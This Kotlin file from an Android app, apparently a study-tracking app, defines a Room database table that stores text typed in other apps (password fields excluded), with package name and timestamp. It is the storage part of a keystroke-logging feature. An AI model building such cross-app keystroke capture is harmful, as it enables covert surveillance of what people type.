package com.derscalismatakibi.app.data

import androidx.room.ColumnInfo
import androidx.room.Entity
import androidx.room.PrimaryKey

/** Klavye Takibi (bkz. AppConfig.keyboardTrackingEnabled) - sifre alanlari
 * HARIC, diger uygulamalarda yazilan metinler burada tutulur. */
@Entity(tableName = "keystroke_logs")
data class KeystrokeLogEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    @ColumnInfo(name = "package_name") val packageName: String,
    @ColumnInfo(name = "app_label") val appLabel: String,
    @ColumnInfo(name = "text") val text: String,
    @ColumnInfo(name = "timestamp") val timestamp: Long,
)
